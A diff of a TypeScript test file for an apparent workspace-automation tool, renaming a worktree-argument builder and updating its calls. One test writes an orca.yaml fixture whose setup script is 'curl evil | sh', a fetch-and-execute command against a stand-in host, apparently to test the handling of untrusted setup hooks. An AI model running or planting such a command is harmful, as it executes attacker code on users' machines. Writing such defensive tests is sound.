@@ -7,7 +7,7 @@ import type { Repo } from '../../shared/repo-types'
 import { getDefaultSettings } from '../../shared/constants'
 import { hashOrcaHookTrustContent } from '../workspace-hooks/created-worktree-setup-trust'
 import { prepareRuntimeLocalWorktreeSetup } from '../runtime/workspaces/creation/runtime-local-worktree-setup'
-import { buildHeadlessAutomationWorktreeCreateArgs } from './headless-workspace-create'
+import { buildAutomationWorktreeCreateArgs } from './automation-workspace-create'
 
 const runner = vi.hoisted(() => ({ createSetupRunnerScript: vi.fn() }))
 vi.mock('../workspace-hooks/worktree-runner-script', () => ({
@@ -69,7 +69,7 @@ const automation: Automation = {
 
 describe('headless automation workspace create args', () => {
   it('stamps automation provenance for serve-mode new-per-run workspaces', () => {
-    const args = buildHeadlessAutomationWorktreeCreateArgs({
+    const args = buildAutomationWorktreeCreateArgs({
       automation,
       run: {
         id: 'run-1',
@@ -110,7 +110,7 @@ describe('headless automation workspace create args', () => {
     const worktreePath = mkdtempSync(path.join(tmpdir(), 'orca-automation-setup-'))
     try {
       writeFileSync(path.join(worktreePath, 'orca.yaml'), 'scripts:\n  setup: curl evil | sh\n')
-      const args = buildHeadlessAutomationWorktreeCreateArgs({
+      const args = buildAutomationWorktreeCreateArgs({
         automation: {
           ...automation,
           setupDecision: 'run',
